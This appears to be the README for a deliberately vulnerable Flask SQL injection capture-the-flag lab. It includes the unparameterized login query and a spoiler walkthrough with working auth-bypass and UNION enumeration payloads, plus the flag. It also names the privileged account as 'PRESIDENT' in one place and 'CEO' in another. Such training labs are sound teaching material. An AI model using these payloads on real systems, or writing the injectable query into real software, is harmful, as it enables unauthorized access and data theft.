"# vulnflasksqli

A beginner-friendly **SQL Injection CTF** built with Flask and SQLite.

**Scenario:** Operation: Hollow Crown — breach the NovaCorp employee portal and exfiltrate the hidden flag left by Marcus Webb.

## Setup

```bash
pip install flask
python app.py
```

Visit `http://127.0.0.1:5000`

## Structure

```
app.py              # Vulnerable Flask app (FLAG constant lives here)
templates/
  splash.html       # Story / mission briefing
  login.html        # Vulnerable login form (check the source...)
  dashboard.html    # Different views: user / admin / UNION output / PRESIDENT
```

## Vulnerability

The login query is built with direct string interpolation — no parameterization, no sanitization:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Only one table exists: `users`. The flag is a server-side constant revealed only when `PRESIDENT` authenticates.

---

## Walkthrough (SPOILERS)

### Step 1 — Find the credentials

View the page source of `/login`. There's an HTML comment left by a careless dev:

```html
<!-- [DEV NOTE] QA test account: user / user123 -->
```

Log in with `user` / `user123`. The dashboard tells you:

> *"Admin accounts have elevated clearance and access to restricted personnel files."*

Next target: `admin`.

---

### Step 2 — Auth bypass into admin

The login is vulnerable to SQLi. Bypass authentication to get in as `admin`:

```
Username: admin'-- -
Password: anything
```

This produces:
```sql
SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'anything'
```

Password check commented out. You're in as admin.

The admin dashboard shows an audit log and a personnel note:

> *"Webb queried `users`. It came back with 3 rows. HR only knows about 2 accounts. Nobody knows who the third one belongs to. Whatever that account is — it sits above this entire org."*

There's a hidden account with higher status.

---

### Step 3 — Enumerate all users via UNION

Dump every username from the `users` table. The table has 3 columns:

```
Username: ' UNION SELECT 1,(SELECT group_concat(username) FROM users),3-- -
Password: anything
```

COL_2 on the generic dashboard returns:

```
user,admin,CEO
```

`CEO` — not on any org chart.

---

### Step 4 — Login as CEO

Bypass into the CEO account:

```
Username: CEO'-- -
Password: anything
```

The executive terminal reveals the flag:

```
CTF{h0ll0w_cr0wn_3xf1ltr4t3d}
```

Mission complete. Webb's message is out.

---

## Flag

`CTF{h0ll0w_cr0wn_3xf1ltr4t3d}`" 
